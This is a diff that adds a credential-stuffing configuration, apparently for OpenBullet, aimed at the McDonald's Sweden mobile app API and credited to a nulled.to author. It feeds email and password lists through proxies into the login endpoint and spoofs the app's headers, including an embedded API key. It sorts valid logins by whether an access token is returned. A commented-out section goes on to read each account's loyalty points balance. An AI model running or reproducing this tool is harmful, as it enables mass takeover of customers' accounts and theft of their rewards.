@@ -1,0 +1,128 @@
+[SETTINGS]
+{
+  "Name": "McDonalds Sweden",
+  "SuggestedBots": 25,
+  "LastModified": "2019-04-22T13:59:36.089548+02:00",
+  "AdditionalInfo": "Bogdan/nulled.to",
+  "Author": "Bogdan",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://con-west-europe-gma.vmobapps.com/v3/logins" 
+  CONTENT "{\"grant_type\":\"password\",\"password\":\"<PASS>\",\"returnConsumerInfo\":true,\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A530F Build/LMY48Z)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "x-vmob-device_network_type: wifi" 
+  HEADER "x-vmob-location_latitude: " 
+  HEADER "x-vmob-device_utc_offset: +8:00" 
+  HEADER "x-plexure-api-key: ctaIH5cBgS/RFGgt6hoPDm09VcFW530DbGcscpE+LSnRHrfURYyRjMxnmuw5C0TeSaLrRd+AE4Ip3FxqEW7k6qtTNlcPvLUX3iCjpAruMvb2Wb8AMzqX0Q==" 
+  HEADER "x-vmob-application_version: 2561" 
+  HEADER "x-vmob-location_longitude: " 
+  HEADER "x-vmob-location_accuracy: " 
+  HEADER "x-vmob-mobile_operator: Orange" 
+  HEADER "x-vmob-cost-center: merchantId582" 
+  HEADER "x-vmob-device_timezone_id: Asia/Shanghai" 
+  HEADER "x-vmob-device_type: a" 
+  HEADER "x-vmob-device: samsung SM-A530F" 
+  HEADER "x-vmob-sdk_version: 4.37.2" 
+  HEADER "x-vmob-uid: a6Gb3zVRMcNtqbDSZ_J_pgUjJdvy9I_bTWC3o36OwRyaQ5rqPh5LpA==_" 
+  HEADER "x-vmob-device_os_version: 5.1.1" 
+  HEADER "x-vmob-beacons: " 
+  HEADER "Accept-Language: sv-SE" 
+  HEADER "x-vmob-device_screen_resolution: 720x1280" 
+  HEADER "Host: con-West-Europe-GMA.vmobapps.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "\"error\":\"The username and password are not correct" 
+
+!PARSE "<SOURCE>" JSON "access_token" -> VAR "token" 
+
+!REQUEST GET "https://con-west-europe-gma.vmobapps.com/v3/consumers/me/verificationtoken?numericToken=true" 
+!  
+!  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A530F Build/LMY48Z)" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: application/json" 
+!  HEADER "x-vmob-device_network_type: wifi" 
+!  HEADER "x-vmob-location_latitude: " 
+!  HEADER "x-vmob-device_utc_offset: +8:00" 
+!  HEADER "x-plexure-api-key: ctaIH5cBgS/RFGgt6hoPDm09VcFW530DbGcscpE+LSnRHrfURYyRjMxnmuw5C0TeSaLrRd+AE4Ip3FxqEW7k6qtTNlcPvLUX3iCjpAruMvb2Wb8AMzqX0Q==" 
+!  HEADER "x-vmob-application_version: 2561" 
+!  HEADER "x-vmob-location_longitude: " 
+!  HEADER "x-vmob-location_accuracy: " 
+!  HEADER "x-vmob-mobile_operator: Orange" 
+!  HEADER "x-vmob-cost-center: merchantId582" 
+!  HEADER "x-vmob-device_timezone_id: Asia/Shanghai" 
+!  HEADER "x-vmob-device_type: a" 
+!  HEADER "x-vmob-device: samsung SM-A530F" 
+!  HEADER "x-vmob-sdk_version: 4.37.2" 
+!  HEADER "x-vmob-uid: a6Gb3zVRMcNtqbDSZ_J_pgUjJdvy9I_bTWC3o36OwRyaQ5rqPh5LpA==_" 
+!  HEADER "x-vmob-device_os_version: 5.1.1" 
+!  HEADER "x-vmob-beacons: " 
+!  HEADER "Accept-Language: sv-SE" 
+!  HEADER "x-vmob-device_screen_resolution: 720x1280" 
+!  HEADER "Authorization: bearer <token>" 
+
+!REQUEST GET "https://off-west-europe-gma.vmobapps.com/v3/loyaltycards?merchantId=582" 
+!  
+!  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A530F Build/LMY48Z)" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: application/json" 
+!  HEADER "x-vmob-device_network_type: wifi" 
+!  HEADER "x-vmob-location_latitude: " 
+!  HEADER "x-vmob-device_utc_offset: +8:00" 
+!  HEADER "x-plexure-api-key: ctaIH5cBgS/RFGgt6hoPDm09VcFW530DbGcscpE+LSnRHrfURYyRjMxnmuw5C0TeSaLrRd+AE4Ip3FxqEW7k6qtTNlcPvLUX3iCjpAruMvb2Wb8AMzqX0Q==" 
+!  HEADER "x-vmob-application_version: 2561" 
+!  HEADER "x-vmob-location_longitude: " 
+!  HEADER "x-vmob-location_accuracy: " 
+!  HEADER "x-vmob-mobile_operator: Orange" 
+!  HEADER "x-vmob-cost-center: merchantId582" 
+!  HEADER "x-vmob-device_timezone_id: Asia/Shanghai" 
+!  HEADER "x-vmob-device_type: a" 
+!  HEADER "x-vmob-device: samsung SM-A530F" 
+!  HEADER "x-vmob-sdk_version: 4.37.2" 
+!  HEADER "x-vmob-uid: a6Gb3zVRMcNtqbDSZ_J_pgUjJdvy9I_bTWC3o36OwRyaQ5rqPh5LpA==_" 
+!  HEADER "x-vmob-device_os_version: 5.1.1" 
+!  HEADER "x-vmob-beacons: " 
+!  HEADER "Accept-Language: sv-SE" 
+!  HEADER "x-vmob-device_screen_resolution: 720x1280" 
+!  HEADER "Authorization: bearer <token>" 
+!  HEADER "Host: con-West-Europe-GMA.vmobapps.com" 
+!  HEADER "Connection: close" 
+!  HEADER "Accept-Encoding: gzip, deflate" 
+
+!KEYCHECK 
+!  KEYCHAIN Success AND 
+!    KEY "\"pointsBalance\"" 
+!    KEY "\"loyaltyCardType\":\"PointsCard\"" 
+!  KEYCHAIN Custom "FREE" AND 
+!    KEY "\"loyaltyCardType\":\"PointsCard\"" 
+!    KEY "<SOURCE>" DoesNotContain "\"pointsBalance\"" 
+!  KEYCHAIN Custom "CUSTOM" OR 
+!    KEY "<SOURCE>" EqualTo "[]" 
+
+!PARSE "<SOURCE>" LR ",\"pointsBalance\":" "," -> CAP "Points" 
+
